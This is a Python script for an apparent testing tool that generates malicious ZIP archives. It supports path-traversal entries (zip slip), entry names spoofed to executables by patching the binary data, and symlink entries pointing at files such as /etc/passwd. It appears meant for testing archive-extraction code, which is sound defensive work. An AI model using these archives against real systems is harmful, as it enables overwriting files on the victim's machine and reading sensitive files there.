# main.py

import argparse
import os
import zipfile
import shutil
import sys
from validators import InputValidator

# `traversal_depth` function determines how many path traversal paths are traversed
def get_traversal_depth():
    if default_mode:
        depth = default_config["pt"]["traversal_depth"]
        if InputValidator.is_int(depth) == False:
            raise SystemExit("Please check the default config file, seems to be an error under path traversal settings.\
                Path traversal depth must be a positive integer")
    else:
        while True:
            depth = input("Enter number of path traversal steps (depth) you would like to test: ").strip()
            print()
            try:
                depth = int(depth)
                break
            except:
                print("Invalid. Depth must be a positive Integer.")
    
    return depth

def get_file_name():
    if default_mode:
        file_name = default_config["pt"]["file_name"]
    else:
        while True:
            file_name = input("Enter file to be saved as a malicious path traversal (e.g. `hello.txt`): ").strip()
            print()
            
            if InputValidator.is_non_empty_string(file_name) == False:
                print("File name can't be an empty string.")
            else:
                break
        
    return file_name

def create_path_traversal(path):
    traversal_depth = get_traversal_depth()
    
    if operating_system == "w":
        path_traversal_dir = ("..\\" * traversal_depth)
    else:
        path_traversal_dir = ("../" * traversal_depth)
        
    path_traversal_dir += path + get_file_name()
    
    while True:
        zip_location = input("Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
        print()
        
        if zip_location:
            if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
                # Create a copy of the ZIP that the user gave
                shutil.copy(zip_location, zip_file)
                break
            else:
                print("Invalid location, zip not found.")
        else:
            break
    
    # TODO: Allow the user to choose a different file to contain path traversal (Only if the user gave a zip file)
    with zipfile.ZipFile(zip_file, 'a') as zipf:
        content = "If you see me, this might me a bad sign..."
        temp_file = "tmp.txt"
        with open(temp_file, "w") as f:
            f.write(content)
        
        # Add them to the ZIP with custom names
        zipf.write(temp_file, arcname=path_traversal_dir)
        os.remove(temp_file)
    
    print(f"New ZIP file created named {zip_file} with `{path_traversal_dir}` as a malicious file.")

def create_spoofed_file(zip_file, filename):
    content = f"Is my name spoofed? If you are not vulnerable, I should have the following file name: {filename}"
    with zipfile.ZipFile(zip_file, 'a') as zipf:
        # Add file to the ZIP
        zipf.writestr(filename, content)
    
def spoof_file_name():
    path_to_file = ""
    original_filename = "original_file.txt"
    spoofed_filename =  "spoofed_file_.exe"
    
    # Get/Create ZIP with a file to spoof its name and the spoofed file name to replace the original file name
    while True:
        zip_location = input("Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
        print()
        
        # If user gave a ZIP he would want to work on
        if zip_location:
            # Verify ZIP location
            if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
                # Create a copy of the ZIP that the user gave
                shutil.copy(zip_location, zip_file)

                # Get the file name to be spoofed
                while True:
                    filename_to_spoof = input("[+] Please enter the current name of the file you wish to spoof.\n "
                        "Please provide the full file path inside the zip (including the file extension), "
                        "e.g. `src/components/index.js`:(Press enter to automatically create a spoofable file) ").strip()
                    print()
                    
                    # If the user provided a file directory to spoof
                    if filename_to_spoof:
                        # Open the ZIP and check if the file exists
                        with zipfile.ZipFile(zip_file, 'r') as zip_ref:
                            zip_contents = zip_ref.namelist()
                            
                            # Verify file name exists in ZIP
                            if filename_to_spoof in zip_contents:
                                # Split the path into directory and file name
                                path_to_file, original_filename = os.path.split(filename_to_spoof)
                                
                                # Get spoofed file name to replace original file name
                                while True:
                                    spoofed_filename = input(f"Please insert a spoofed file name to replace the original name `{original_filename}` with.\n"
                                        f"!! Notice, the spoofed name should contain exactly {len(original_filename)} characters !!\n").strip()
                                    print()
                                    
                                    # Verify spoofed file name is equal to original name
                                    if len(original_filename) != len(spoofed_filename):
                                        print("Original file name and spoofed Filenames lengths must be equal")
                                    
                                    # Exit loop
                                    else:
                                        break
                                
                                # Exit loop
                                break
                            else:
                                print(f"`{filename_to_spoof}` does not exist in the given zip. Please double check the file name and try again.")                                # Will start loop again and request file name again
                    
                    # Add a default file to spoof
                    else:
                        create_spoofed_file(zip_file, original_filename)
                
                        # Exit loop
                        break
                
                # Exit loop
                break
            
            # ZIP not found
            else:
                # Will start loop again and request valid zip location again
                print("Invalid location, zip not found.")
        
        # Create a new ZIP containing a spoofable file
        else:
            create_spoofed_file(zip_file, original_filename)
            
            # Exit loop
            break

    # Replace the file name within the ZIP binary data
    with open(zip_file, 'rb') as zipf:
        zip_data = zipf.read()
        # Replace the filename within the ZIP binary data
        if path_to_file != "":
            path_to_file = path_to_file + "/"
        spoofed_data = zip_data.replace(bytes(path_to_file+original_filename, 'utf-8'), bytes(path_to_file+spoofed_filename, 'utf-8'), 1)

    # Write the modified data back to the ZIP file
    with open(zip_file, 'wb') as zipf:
        zipf.write(spoofed_data)
    
    print(f"New ZIP file created named {zip_file} with spoofed file name `{spoofed_filename}`, replacing `{original_filename}` file name.")

def create_symlink():
    # Get/Create ZIP with a file to link the symlink
    while True:
        zip_location = input("[+] Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
        
        # If user gave a ZIP he would want to work on
        if zip_location:
            # Verify ZIP location
            if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
                # Create a copy of the ZIP that the user gave
                shutil.copy(zip_location, zip_file)
                
                print(f"[i] Using existing ZIP '{zip_location}'\n")
                
                # Exit loop
                break
            
            # ZIP not found
            else:
                # Will start loop again and request valid zip location again
                print("[!] Invalid location, zip not found.\n")
        
        # Create a new ZIP (Will happen later on in the code...)
        else:
            print(f"[i] Creating a new ZIP\n")

            # Exit loop
            break
    
    # Get file name to create the symlink with
    filename_to_symlink = default_config["fns"]["filename_to_symlink"]
    filename_to_symlink = input("[+]Enter a custom file name (and path) to create the symlink with, e.g. `src/components/symlink.js` || `link_to_passwd`.\n"
        f"Press Enter to skip and use the default file `{filename_to_symlink}`: ").strip() or filename_to_symlink
    print(f"[i] Creating a new file `{filename_to_symlink}`\n")
    
    # Create a symlink within the ZIP
    zipInfo = zipfile.ZipInfo(".")
    zipInfo.create_system = 3
    zipInfo.external_attr = 2716663808
    zipInfo.filename = filename_to_symlink
    
     # Get file name to create the symlink with
    symlink_target = default_config["fns"]["symlink_target"]
    symlink_target = input(f"[+] Enter symlink target, e.g. `/etc/passwd`. Press Enter to skip and use the default file `{symlink_target}`: ").strip() or symlink_target
    print(f"[i] Creating a symbolic link between `{filename_to_symlink}` to `{symlink_target}`\n")
    
    # Create new ZIP/Work on the copy of the given ZIP
    with zipfile.ZipFile(zip_file, 'a') as zipf:
        zipf.writestr(zipInfo, symlink_target)

def main():
    global operating_system, default_mode
    try:
        # Initialize the argument parser
        parser = argparse.ArgumentParser(
            description="A script that accepts a 'type' argument, an optional 'operating system' argument, and a 'default' mode."
        )
        
        # Add the 'type' argument (mandatory)
        parser.add_argument(
            "-t", "--type",
            choices=["pt", "fns", "sym", "dos"],
            help="Specify the type of vulnerability: pt (path traversal), fns (file name spoofing), sym (symlink), dos (Denial of Service). Default is Path Traversal"
        )
        
        # Add the 'operating system' argument (optional)
        parser.add_argument(
            "-os", "--operating-system",
            choices=["w", "l", "u"],
            default=default_config["operating_system"],
            help="Specify the operating system: w (windows), l (linux), or u (unix). Default is linux"
        )
        
        # Add the 'path' argument (optional)
        parser.add_argument(
            "-p", "--path",
            default=default_config["pt"]["path"][default_config["operating_system"]],
            help="Path to include in file name after traversal. e.g. `etc/`. For an empty path, add the argument with an empty double quote - \"\""
        )
        
        # Add the 'default' argument (optional, no data required)
        parser.add_argument(
            "-D", "--default",
            action="store_true",
            help="Enable default mode (no additional data required)."
        )
        
        # Parse the arguments
        args = parser.parse_args()
        
        # Determine if default mode is enabled
        default_mode = args.default
        
        # Output the results
        allowed_operating_systems = ["w", "l", "u"]
        operating_system = args.operating_system
        if operating_system not in allowed_operating_systems:
            print(f"Invalid operating system. Supported operating systems are: {', '.join(allowed_operating_systems)}")
            exit(1)
        
        match args.type:
            case "pt":
                create_path_traversal(args.path)
            case "fns":
                spoof_file_name()
            case "sym":
                if operating_system == "w":
                    print("Unfortunately, ZIP symlink attack is not supported for Windows by this tool.\n"
                          "If you have a Windows script that can help with this, please feel free to open a Pull Request on GitHub.")
                    exit(1)
                create_symlink()
            case "dos":
                print("Denial of Service selected")
            case _:
                create_path_traversal(args.path)
    except KeyboardInterrupt:
        print("\nOperation cancelled by the user. Exiting gracefully...")
        sys.exit(0)

# TODO: Load default settings from config file
default_config = {
    "zip_name": "Archive.zip",
    "operating_system": "l",
    "pt": {
        "traversal_depth": 7,
        "file_name": "path_traversal_by_noam.exe",
        "path": {
            "l": "tmp/",
            "w": "Windows\\",
            "u": "tmp/"
        }
    },
    "fns": {
        "filename_to_symlink": "symlink_by_noam.txt",
        "symlink_target": "/etc/hosts"
    }
}

zip_file = default_config["zip_name"]

default_mode = False
        
if __name__ == "__main__":
    main()